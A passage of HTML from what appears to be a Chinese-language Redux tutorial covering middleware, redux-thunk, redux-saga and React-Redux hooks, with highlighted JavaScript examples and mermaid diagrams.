constant_">USER_FETCH_REQUESTED</span> = <span class="hljs-string">&#x27;USER_FETCH_REQUESTED&#x27;</span>;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">TODOS_ADD</span> = <span class="hljs-string">&#x27;TODOS_ADD&#x27;</span>;<br><br><span class="hljs-comment">// Action创建函数：动词+名词</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchUser</span>(<span class="hljs-params">id</span>) &#123; ... &#125;<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">addTodo</span>(<span class="hljs-params">text</span>) &#123; ... &#125;<br></code></pre></td></tr></table></figure><p><strong>状态设计原则</strong></p><ol><li>扁平化结构：避免嵌套过深</li><li>按业务域拆分：不同功能独立状态分支</li><li>ID驱动：通过ID关联数据</li></ol><h3 id="总结：Redux-核心概念关系图"><a href="#总结：Redux-核心概念关系图" class="headerlink" title="总结：Redux 核心概念关系图"></a>总结：Redux 核心概念关系图</h3><pre class="mermaid">graph TD  A[Action] -->|描述| B[Reducer]  B -->|生成| C[Store]  C -->|提供| D[View]  D -->|触发| A  E[Middleware] -->|拦截| A  F[Selector] -->|获取| C  G[React-Redux] -->|连接| D</pre><h2 id="5-3-Redux-中间件（redux-thunk、redux-saga）"><a href="#5-3-Redux-中间件（redux-thunk、redux-saga）" class="headerlink" title="5.3 Redux 中间件（redux-thunk、redux-saga）"></a>5.3 Redux 中间件（redux-thunk、redux-saga）</h2><h3 id="Redux-中间件核心原理"><a href="#Redux-中间件核心原理" class="headerlink" title="Redux 中间件核心原理"></a>Redux 中间件核心原理</h3><p><strong>中间件在数据流中的位置</strong></p><pre class="mermaid">graph LR  A[View] -->|dispatch| B[Middleware]  B -->|"next(action)"| C[Reducer]  C --> D[Store]  D -->|newState| A</pre><p><strong>中间件签名与执行链</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 中间件结构（柯里化函数）</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">middleware</span> = store =&gt; <span class="hljs-function"><span class="hljs-params">next</span> =&gt;</span> <span class="hljs-function"><span class="hljs-params">action</span> =&gt;</span> &#123;<br>  <span class="hljs-comment">// 前置处理</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;dispatching:&#x27;</span>, action);<br>  <br>  <span class="hljs-comment">// 传递 action 给下一个中间件或 reducer</span><br>  <span class="hljs-keyword">const</span> result = <span class="hljs-title function_">next</span>(action);<br>  <br>  <span class="hljs-comment">// 后置处理</span><br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;next state:&#x27;</span>, store.<span class="hljs-title function_">getState</span>());<br>  <span class="hljs-keyword">return</span> result;<br>&#125;;<br><br><span class="hljs-comment">// 中间件执行顺序</span><br><span class="hljs-title function_">applyMiddleware</span>(mid1, mid2, mid3)<br><span class="hljs-comment">// 实际调用顺序：</span><br><span class="hljs-comment">// mid1(store) -&gt; mid2(store) -&gt; mid3(store) -&gt; reducer</span><br></code></pre></td></tr></table></figure><h3 id="redux-thunk：处理简单异步"><a href="#redux-thunk：处理简单异步" class="headerlink" title="redux-thunk：处理简单异步"></a>redux-thunk：处理简单异步</h3><p><strong>核心概念</strong></p><p>允许 action 创建函数返回函数（而不仅是对象），该函数接收 dispatch 和 getState 作为参数</p><p><strong>使用示例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 同步 action</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">increment</span> = (<span class="hljs-params"></span>) =&gt; (&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;INCREMENT&#x27;</span> &#125;);<br><br><span class="hljs-comment">// 异步 action (thunk)</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchUser</span> = (<span class="hljs-params">userId</span>) =&gt; <span class="hljs-title function_">async</span> (dispatch, getState) =&gt; &#123;<br>  <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_REQUEST&#x27;</span> &#125;);<br>  <br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">getUser</span>(userId);<br>    <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_SUCCESS&#x27;</span>, <span class="hljs-attr">payload</span>: user &#125;);<br>    <br>    <span class="hljs-comment">// 可访问当前状态</span><br>    <span class="hljs-keyword">const</span> &#123; settings &#125; = <span class="hljs-title function_">getState</span>();<br>    <span class="hljs-keyword">if</span> (settings.<span class="hljs-property">notify</span>) <span class="hljs-title function_">showNotification</span>(<span class="hljs-string">&#x27;用户加载成功&#x27;</span>);<br>    <br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_FAILURE&#x27;</span>, error &#125;);<br>  &#125;<br>&#125;;<br><br><span class="hljs-comment">// 组件中触发</span><br><span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">fetchUser</span>(<span class="hljs-number">123</span>));<br></code></pre></td></tr></table></figure><p><strong>适用场景</strong></p><ul><li>API 请求</li><li>简单异步操作</li><li>需要访问当前状态的异步逻辑</li></ul><p><strong>优点与局限</strong></p><table><thead><tr><th align="left">优点</th><th align="left">局限</th></tr></thead><tbody><tr><td align="left">学习成本低</td><td align="left">复杂异步流程难管理</td></tr><tr><td align="left">代码简洁</td><td align="left">测试相对复杂</td></tr><tr><td align="left">无需额外库</td><td align="left">不支持高级异步模式</td></tr></tbody></table><h3 id="redux-saga：处理复杂异步"><a href="#redux-saga：处理复杂异步" class="headerlink" title="redux-saga：处理复杂异步"></a>redux-saga：处理复杂异步</h3><p><strong>核心概念</strong></p><pre class="mermaid">graph TD  A[View] -->|dispatch| B[Action]  B --> C[Watcher Saga]  C --> D[Worker Saga]  D --> E[API Call]  E --> F[Action to Store]</pre><p><strong>关键特性</strong></p><ul><li>基于 ES6 Generator 函数</li><li>集中管理副作用（side effects）</li><li>提供丰富异步控制原语（takeEvery, takeLatest 等）</li><li>支持竞态条件处理、并行任务等复杂场景</li></ul><p><strong>使用示例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; call, put, takeEvery &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;redux-saga/effects&#x27;</span>;<br><br><span class="hljs-comment">// Worker Saga</span><br><span class="hljs-keyword">function</span>* <span class="hljs-title function_">fetchUser</span>(<span class="hljs-params">action</span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">yield</span> <span class="hljs-title function_">call</span>(api.<span class="hljs-property">getUser</span>, action.<span class="hljs-property">payload</span>);<br>    <span class="hljs-keyword">yield</span> <span class="hljs-title function_">put</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_SUCCESS&#x27;</span>, <span class="hljs-attr">payload</span>: user &#125;);<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    <span class="hljs-keyword">yield</span> <span class="hljs-title function_">put</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_FAILURE&#x27;</span>, error &#125;);<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// Watcher Saga</span><br><span class="hljs-keyword">function</span>* <span class="hljs-title function_">watchUserRequests</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">yield</span> <span class="hljs-title function_">takeEvery</span>(<span class="hljs-string">&#x27;USER_REQUEST&#x27;</span>, fetchUser);<br>&#125;<br><br><span class="hljs-comment">// 根Saga</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">function</span>* <span class="hljs-title function_">rootSaga</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">yield</span> <span class="hljs-title function_">all</span>([<br>    <span class="hljs-title function_">watchUserRequests</span>(),<br>    <span class="hljs-comment">// 其他 watcher</span><br>  ]);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>常用 Effect 原语</strong></p><table><thead><tr><th align="left">Effect</th><th align="left">作用</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">call</td><td align="left">调用异步函数</td><td align="left">yield call(api.fetch, url)</td></tr><tr><td align="left">put</td><td align="left">发起 action</td><td align="left">yield put({ type: ‘SUCCESS’ })</td></tr><tr><td align="left">take</td><td align="left">等待指定 action</td><td align="left">yield take(‘ACTION’)</td></tr><tr><td align="left">takeEvery</td><td align="left">监听每个 action</td><td align="left">yield takeEvery(‘ACTION’, saga)</td></tr><tr><td align="left">takeLatest</td><td align="left">只响应最新的 action</td><td align="left">yield takeLatest(‘ACTION’, saga)</td></tr><tr><td align="left">fork</td><td align="left">非阻塞调用 saga</td><td align="left">yield fork(otherSaga)</td></tr><tr><td align="left">all</td><td align="left">并行运行多个 Effect</td><td align="left">yield all([call(a), call(b)])</td></tr><tr><td align="left">race</td><td align="left">竞态执行</td><td align="left">yield race({ task: call(fn), cancel: take(‘CANCEL’) })</td></tr></tbody></table><h3 id="高频面试题与破解方案-13"><a href="#高频面试题与破解方案-13" class="headerlink" title="高频面试题与破解方案"></a>高频面试题与破解方案</h3><p><strong>Q：为什么需要中间件处理异步？</strong></p><ol><li>Redux 自身限制：reducer 必须是纯函数，不能包含副作用</li><li>可预测性：集中管理副作用，避免分散在组件中</li><li>可维护性：统一处理错误、日志、重试等通用逻辑</li><li>高级功能：实现请求取消、竞态处理等复杂场景</li></ol><p><strong>Q：如何选择 thunk 还是 saga？</strong></p><pre class="mermaid">graph TD  A[项目需求] --> B{异步复杂度}  B -->|简单API请求| C[redux-thunk]  B -->|复杂流程/竞态| D[redux-saga]  A --> E{团队熟悉度}  E -->|熟悉Generator| D  E -->|新手团队| C  A --> F{包大小敏感}  F -->|是| C  F -->|否| D</pre><h2 id="5-4-React-Redux（Provider、useSelector、useDispatch）"><a href="#5-4-React-Redux（Provider、useSelector、useDispatch）" class="headerlink" title="5.4 React-Redux（Provider、useSelector、useDispatch）"></a>5.4 React-Redux（Provider、useSelector、useDispatch）</h2><h3 id="React-Redux-核心架构图"><a href="#React-Redux-核心架构图" class="headerlink" title="React-Redux 核心架构图"></a>React-Redux 核心架构图</h3><pre class="mermaid">graph TD  A[Redux Store] --> B[Provider]  B -->|Context| C[React Components]  C -->|useSelector| A  C -->|useDispatch| A</pre><h3 id="Provider：状态注入的基石"><a href="#Provider：状态注入的基石" class="headerlink" title="Provider：状态注入的基石"></a>Provider：状态注入的基石</h3><p><strong>核心作用与原理</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Provider</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><span class="hljs-keyword">import</span> store <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;./store&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Provider</span> <span class="hljs-attr">store</span>=<span class="hljs-string">&#123;store&#125;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">MainApp</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">Provider</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>作用：通过 React Context 将 Redux store 注入整个组件树</li><li>原理：使用 React.createContext() 创建 Store 上下文</li><li>位置：必须在组件树最顶层</li></ul><p><strong>实现原理揭秘</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 简化版 Provider 实现</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">StoreContext</span> = <span class="hljs-title class_">React</span>.<span class="hljs-title function_">createContext</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Provider</span>(<span class="hljs-params">&#123; store, children &#125;</span>) &#123;<br>  <span class="hljs-comment">// 使用 useMemo 避免重复渲染</span><br>  <span class="hljs-keyword">const</span> contextValue = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> (&#123; store &#125;), [store]);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">StoreContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&#123;contextValue&#125;</span>&gt;</span></span><br><span class="language-xml">      &#123;children&#125;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">StoreContext.Provider</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="useSelector：精准状态选择"><a href="#useSelector：精准状态选择" class="headerlink" title="useSelector：精准状态选择"></a>useSelector：精准状态选择</h3><p><strong>基础用法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; useSelector &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserProfile</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 从 Redux store 选择所需状态</span><br>  <span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">user</span>);<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>&#123;user.name&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>性能优化机制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 默认使用 === 严格相等比较</span><br><span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">user</span>);<br><br><span class="hljs-comment">// 自定义比较函数</span><br><span class="hljs-keyword">const</span> user = <span class="hljs-title function_">useSelector</span>(<br>  <span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">user</span>,<br>  <span class="hljs-function">(<span class="hljs-params">prevUser, nextUser</span>) =&gt;</span> prevUser.<span class="hljs-property">id</span> === nextUser.<span class="hljs-property">id</span><br>);<br></code></pre></td></tr></table></figure><p><strong>高级选择器模式</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用 reselect 库创建记忆化选择器</span><br><span class="hljs-keyword">import</span> &#123; createSelector &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;reselect&#x27;</span>;<br><br><span class="hljs-keyword">const</span> selectActiveUsers = <span class="hljs-title function_">createSelector</span>(<br>  [<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">users</span>],<br>  <span class="hljs-function"><span class="hljs-params">users</span> =&gt;</span> users.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">user</span> =&gt;</span> user.<span class="hljs-property">isActive</span>)<br>);<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ActiveUsersList</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> activeUsers = <span class="hljs-title function_">useSelector</span>(selectActiveUsers);<br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="useDispatch：触发状态更新"><a href="#useDispatch：触发状态更新" class="headerlink" title="useDispatch：触发状态更新"></a>useDispatch：触发状态更新</h3><p><strong>基础用法</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; useDispatch &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-redux&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">AddTodoButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useDispatch</span>();<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>, <span class="hljs-attr">text</span>: <span class="hljs-string">&#x27;New todo&#x27;</span> &#125;);<br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleClick&#125;</span>&gt;</span>添加<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>封装动作创建函数</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 动作创建函数</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">addTodo</span> = (<span class="hljs-params">text</span>) =&gt; (&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;ADD_TODO&#x27;</span>, text &#125;);<br><br><span class="hljs-comment">// 组件中使用</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">AddTodoButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useDispatch</span>();<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleClick</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">addTodo</span>(<span class="hljs-string">&#x27;New todo&#x27;</span>)); <span class="hljs-comment">// 直接 dispatch action</span><br>  &#125;;<br>  <br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleClick&#125;</span>&gt;</span>添加<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>异步操作集成</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 使用 redux-thunk</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">fetchUser</span> = (<span class="hljs-params">id</span>) =&gt; <span class="hljs-keyword">async</span> dispatch =&gt; &#123;<br>  <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_REQUEST&#x27;</span> &#125;);<br>  <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> api.<span class="hljs-title function_">getUser</span>(id);<br>  <span class="hljs-title function_">dispatch</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;USER_SUCCESS&#x27;</span>, <span class="hljs-attr">payload</span>: user &#125;);<br>&#125;;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserLoader</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useDispatch</span>();<br>  <br>  <span class="hljs-title function_">useEffect</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">fetchUser</span>(<span class="hljs-number">123</span>));<br>  &#125;, [dispatch]);<br>  <br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="三大-Hook-协作模式"><a href="#三大-Hook-协作模式" class="headerlink" title="三大 Hook 协作模式"></a>三大 Hook 协作模式</h3><p>完整数据流示例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">TodoList</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-comment">// 1. 获取状态</span><br>  <span class="hljs-keyword">const</span> todos = <span class="hljs-title function_">useSelector</span>(<span class="hljs-function"><span class="hljs-params">state</span> =&gt;</span> state.<span class="hljs-property">todos</span>);<br>  <br>  <span class="hljs-comment">// 2. 获取 dispatch 函数</span><br>  <span class="hljs-keyword">const</span> dispatch = <span class="hljs-title function_">useDispatch</span>();<br>  <br>  <span class="hljs-comment">// 3. 事件处理</span><br>  <span class="hljs-keyword">const</span> handleAdd = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">addTodo</span>(<span class="hljs-string">&#x27;新任务&#x27;</span>));<br>  &#125;, [dispatch]);<br>  <br>  <span class="hljs-keyword">const</span> handleToggle = <span class="hljs-title function_">useCallback</span>(<span class="hljs-function"><span class="hljs-params">id</span> =&gt;</span> &#123;<br>    <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">toggleTodo</span>(id));<br>  &#125;, [dispatch]);<br>  <br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleAdd&#125;</span>&gt;</span>添加任务<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">        &#123;todos.map(todo =&gt; (</span><br><span class="language-xml">          <span class="hljs-tag">&lt;<span class="hljs-name">TodoItem</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">key</span>=<span class="hljs-string">&#123;todo.id&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">todo</span>=<span class="hljs-string">&#123;todo&#125;</span> </span></span><br><span class="hljs-tag"><span class="language-xml">            <span class="hljs-attr">onToggle</span>=<span class="hljs-string">&#123;handleToggle&#125;</span></span></span><br><span class="hljs-tag"><span class="language-xml">          /&gt;</span></span><br><span class="language-xml">        ))&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="connect-高阶组件（传统写法）"><a href="#connect-高阶组件（传统写法）" class="headerlink" title="connect 高阶组件（传统写法）"></a>connect 高阶组件（传统写法）</h3><p><strong>mapStateToProps</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">mapStateToProps</span> = (<span class="hljs-params">state, ownProps</span>) =&gt; (&#123;<br>  <span class="hljs-attr">todos</span>: state.<span class="hljs-property">todos</span>,<br>  <span class="hljs-attr">currentUser</span>: state.<span class="hljs-property">users</span>[ownProps.<span class="hljs-property">userId</span>]<br>&#125;);<br><br><span class="hljs-comment">// 组件中通过 props 访问</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TodoList</span>(<span class="hljs-params">&#123; todos, currentUser &#125;</span>) &#123;<br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>mapDispatchToProps</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 对象简写（自动绑定 dispatch）</span><br><span class="hljs-keyword">const</span> mapDispatchToProps = &#123;<br>  addTodo,<br>  deleteTodo<br>&#125;;<br><br><span class="hljs-comment">// 函数形式</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">mapDispatchToProps</span> = (<span class="hljs-params">dispatch</span>) =&gt; (&#123;<br>  <span class="hljs-attr">addTodo</span>: <span class="hljs-function">(<span class="hljs-params">text</span>) =&gt;</span> <span class="hljs-title function_">dispatch</span>(<span class="hljs-title function_">addTodo</span>(text)),<br>  <span class="hljs-attr">deleteTodo</span>: <span class="hljs-function">(<span class="hljs-params">id</span>) =&gt;</span> <span class="hljs-title 